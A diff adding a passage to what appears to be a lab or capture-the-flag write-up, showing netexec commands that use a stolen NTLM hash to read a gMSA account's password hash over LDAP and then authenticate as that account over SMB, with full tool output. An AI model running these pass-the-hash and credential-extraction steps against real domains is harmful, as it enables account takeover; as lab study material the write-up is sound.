@@ -630,6 +630,22 @@ After some research about the value i need to append i updated it using bloodyAD
 After first getting the SID of the object `jay` i can use that to write the value to the property, now i should be able to read it
 
 ```python
-
+nxc ldap dc01.casper.hsm -u jay -H '9b88ec231f4f0e5cb7d9edef1f399f6c' --gmsa                                                                                                   
+LDAP        10.0.31.82      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:casper.hsm) (signing:Enforced) (channel binding:When Supported) 
+LDAP        10.0.31.82      389    DC01             [+] casper.hsm\jay:9b88ec231f4f0e5cb7d9edef1f399f6c 
+LDAP        10.0.31.82      389    DC01             [*] Getting GMSA Passwords
+LDAP        10.0.31.82      389    DC01             Account: casper-gmsa$         NTLM: 7abcd8de1d2e107237f8fd5baea13d68     PrincipalsAllowedToReadPassword: jay
 ```
+
+Now i have his hash
+
+```python
+xc smb dc01.casper.hsm -u 'casper-gmsa$' -H '7abcd8de1d2e107237f8fd5baea13d68' --smb-timeout 5
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\casper-gmsa$:7abcd8de1d2e107237f8fd5baea13d68
+```
+
+This user is now compromised!
+
+
 
